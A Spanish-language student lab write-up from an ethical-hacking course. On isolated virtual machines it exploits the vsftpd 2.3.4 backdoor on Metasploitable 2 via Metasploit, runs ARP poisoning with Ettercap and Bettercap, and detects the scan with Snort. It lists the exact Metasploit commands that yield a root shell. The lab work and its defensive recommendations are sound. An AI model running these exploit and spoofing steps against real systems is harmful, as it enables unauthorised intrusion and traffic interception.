---
titulo: Laboratorio ofensivo controlado con Metasploit y ARP spoofing
resumen: Explotación de un servicio vulnerable en Metasploitable 2, ataque de intermediario por envenenamiento ARP con Ettercap y Bettercap, y detección del escaneo con Snort, todo en una red aislada de máquinas virtuales.
area: ciberseguridad
categoria: redes
tipo: laboratorio
estado: B
destacado: false
orden: 5
fecha: Curso 2025–2026
contexto: Actividad del módulo de Hacking ético. Entender cómo se ejecuta un ataque es la base para detectarlo; el laboratorio se realizó sobre una máquina vulnerable a propósito, en una red NAT aislada.
objetivo: Recorrer un ataque básico de principio a fin y comprobar qué rastro deja para el defensor.
problema: Un servicio sin actualizar y un protocolo sin autenticación (ARP) bastan para comprometer un equipo o interceptar su tráfico en una red local.
entorno:
  - "Kali Linux (atacante) y Metasploitable 2 (objetivo) en una red NAT de VirtualBox."
  - "Ubuntu Server con Snort para la parte de detección."
  - "Windows 10 para la parte de metadatos con FOCA."
herramientas: [Metasploit Framework, Nmap, Ettercap, Bettercap, Snort, PostgreSQL, VirtualBox]
resultados:
  - "Escaneo de los 65 535 puertos desde Metasploit con db_nmap."
  - "Explotación de la puerta trasera de vsftpd 2.3.4 y obtención de una consola con privilegios de root en la máquina de laboratorio."
  - "Envenenamiento ARP con Ettercap: la tabla ARP de la víctima muestra la puerta de enlace con la MAC del atacante."
  - "Descubrimiento de equipos con Bettercap (net.recon)."
  - "Snort registra en snort.alert.fast el escaneo SYN lanzado desde Kali."
problemas:
  - "db_nmap fallaba porque la base de datos de Metasploit no estaba iniciada: hubo que arrancar PostgreSQL y ejecutar msfdb init."
  - "FOCA no devolvió documentos en ningún buscador pese a varios intentos, así que la parte de metadatos quedó sin resultados."
limitaciones:
  - "Todo se hizo contra máquinas propias y vulnerables a propósito, en una red aislada."
  - "La parte de FOCA no produjo resultados."
recomendaciones:
  - "Inspección dinámica de ARP y segmentación en los conmutadores, protocolos cifrados y monitorización de cambios en las tablas ARP."
  - "Inventario de versiones y parcheo: la puerta trasera de vsftpd 2.3.4 es pública desde 2011."
competencias: [vulnerabilidades, redes, deteccion, metodologia]
pendiente:
  - Copia saneada del informe con las capturas de la tabla ARP y de las alertas.
---

### Explotación del servicio vulnerable

```text
msf > db_nmap 10.0.2.3 -p 1-65535
msf > search vsftpd
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf > set RHOSTS 10.0.2.3
msf > set payload cmd/unix/interact
msf > exploit
```

### Intermediario por ARP

En Ettercap se añaden la víctima y la puerta de enlace como objetivos y se lanza **Mitm › ARP poisoning**. La comprobación se hace en la víctima, con `arp`, antes y después: la dirección MAC asociada a la puerta de enlace cambia a la del atacante.

### Detección

El mismo escaneo que abre el ataque (`nmap -sS`) queda registrado por Snort en el sensor. La práctica de [detección de escaneos](/proyectos/snort-deteccion-nmap/) desarrolla esa regla.
